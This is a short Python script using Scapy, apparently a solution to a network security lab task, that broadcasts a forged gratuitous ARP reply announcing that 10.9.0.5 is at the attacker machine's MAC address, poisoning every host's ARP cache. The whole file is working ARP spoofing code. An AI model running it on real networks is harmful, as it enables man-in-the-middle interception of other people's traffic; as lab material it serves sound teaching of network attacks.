#!/usr/bin/env python3
# Task 1.C -- poison caches with a gratuitous ARP (broadcast).
# Announces that 10.9.0.5 (A) is at M's MAC to everyone.
from scapy.all import *

IP_A = '10.9.0.5'
mac_M = get_if_hwaddr('eth0')

E = Ether(src=mac_M, dst='ff:ff:ff:ff:ff:ff')
A = ARP(op=2, hwsrc=mac_M, psrc=IP_A, hwdst='ff:ff:ff:ff:ff:ff', pdst=IP_A)
sendp(E/A)
